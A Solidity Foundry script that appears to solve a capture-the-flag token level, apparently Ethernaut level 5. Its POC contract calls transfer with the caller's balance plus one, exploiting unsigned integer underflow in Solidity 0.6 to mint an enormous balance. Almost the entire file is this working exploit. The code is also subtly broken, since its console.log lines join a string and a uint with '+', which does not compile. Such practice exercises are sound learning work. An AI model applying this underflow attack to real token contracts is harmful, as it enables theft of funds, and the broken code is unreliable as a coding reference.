// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level5/Token.sol";

// Objective:
// The goal of this level is for you to hack the basic token contract below.
// You are given 20 tokens to start with and you will beat the level if you somehow
//  manage to get your hands on any additional tokens. Preferably a very large amount of tokens.


contract POC is Script {
    Token instance = Token(0x1aB5fd6aB75dB7084b48399AE7cF410Af2c8EE3e);

    function run() external {
        vm.startBroadcast();
        console.log("Initial Balance: " + instance.balanceOf(msg.sender));

        uint balance = instance.balanceOf(msg.sender);
        instance.transfer(address(this), balance+1);

        console.log("Final Balance: " + instance.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
